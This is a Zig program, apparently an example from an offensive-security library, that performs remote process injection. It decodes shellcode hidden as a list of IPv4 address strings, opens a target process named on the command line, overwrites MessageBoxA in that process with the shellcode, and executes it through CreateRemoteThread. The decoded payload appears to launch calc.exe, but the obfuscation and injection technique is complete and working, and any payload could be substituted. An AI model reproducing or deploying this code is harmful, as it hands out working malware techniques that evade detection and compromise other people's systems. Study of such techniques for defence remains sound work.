const std = @import("std");
const sec = @import("zig-sec");
const win = @import("zigwin32").everything;

const INFINITE = win.INFINITE;

const CreateRemoteThread = win.CreateRemoteThread;
const WaitForSingleObject = win.WaitForSingleObject;
const GetLastError = win.GetLastError;

const payload_obfuscation = sec.payload_obfuscation;
const code_injection = sec.code_injection;

const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shell_code = try payload_obfuscation.ipv4.deobfuscate(allocator, &ipv4_array);
    defer allocator.free(shell_code);

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;

    const process_name = args[1];
    const process = try sec.process.openProcessByName(process_name);

    const message_box_a = try sec.common.loadFunction(*anyopaque, "user32.dll", "MessageBoxA");

    try code_injection.remote.injectShellCode(process.h_process, message_box_a.func, shell_code);

    const h_thread = CreateRemoteThread(
        process.h_process,
        null,
        0,
        @ptrCast(message_box_a.func),
        null,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateRemoteThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateRemoteThreadFailed;
    };
    _ = WaitForSingleObject(h_thread, INFINITE);
}
